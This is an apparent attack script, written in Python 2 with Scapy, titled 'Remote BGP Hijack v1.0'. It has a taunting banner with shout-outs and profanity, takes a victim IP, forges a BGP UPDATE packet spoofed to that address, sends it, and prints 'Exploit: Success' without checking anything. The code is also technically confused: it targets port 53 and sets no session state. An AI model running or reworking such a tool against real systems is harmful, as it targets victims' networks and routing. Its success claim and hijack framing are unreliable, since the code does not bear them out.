#!/usr/bin/env python2

import time
from scapy.all import *
import sys
load_contrib('bgp')

print "Remote BGP Hijack v1.0\n"
print "Made by: https://twitter.com/cvvboy\n"
print "Based in the HQ of Russia\n"
print "S/O to: antichrist, pein, komodo, ryan, starfall, sp3c, kms, satan, lucifer, hades, alg0d, drag0n, abdilo\n"
print "Holding it down in Russia and NO not Texas fuck off KMS you got only a shout out!\n"
print "~ drag0n\n"

try:
    ips = sys.argv[1]
except:
    print sys.argv[0]+" <IP (IP Address/Victim/Target)>\n"
    sys.exit(0)

frame1 = Ether()

for i in range(1, 2):

    setORIGIN=BGPPathAttr(type_flags="Transitive", type_code="ORIGIN", attribute=[BGPPAOrigin(origin="IGP")])
    setAS=BGPPathAttr(type_flags="Transitive", type_code="AS_PATH", attribute=None)
    setNEXTHOP=BGPPathAttr(type_flags="Transitive", type_code="NEXT_HOP", attribute=[BGPPANextHop(next_hop="1.3.3.7")])
    setMED=BGPPathAttr(type_flags="Optional", type_code="MULTI_EXIT_DISC", attribute=[BGPPAMultiExitDisc(med=0)])
    setLOCALPREF=BGPPathAttr(type_flags="Transitive", type_code="LOCAL_PREF", attribute=[BGPPALocalPref(local_pref=100)]) 

    bgp_update = IP(src=ips, dst=ips, ttl=64)\
        /TCP(dport=53, sport=179, flags='PA', seq=RandShort(), ack=RandShort())\
        /BGPHeader(marker=340282366920938463463374607431768211455, type="UPDATE")\
        /BGPUpdate(withdrawn_routes_len=0, \
        path_attr=[setORIGIN, setAS, setNEXTHOP, setMED, setLOCALPREF], nlri=[BGPNLRI_IPv4(prefix="195.47.253.4/32")])


    del bgp_update[BGPHeader].len
    del bgp_update[BGPHeader].path_attr_len
    del bgp_update[BGPUpdate].path_attr_len
    del bgp_update[BGPUpdate][0][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][1][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][3][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][4][BGPPathAttr].attr_len
    del bgp_update[IP].len

    bgp_update.show()
    sendp(frame1/bgp_update)
    print "Exploit: Success"



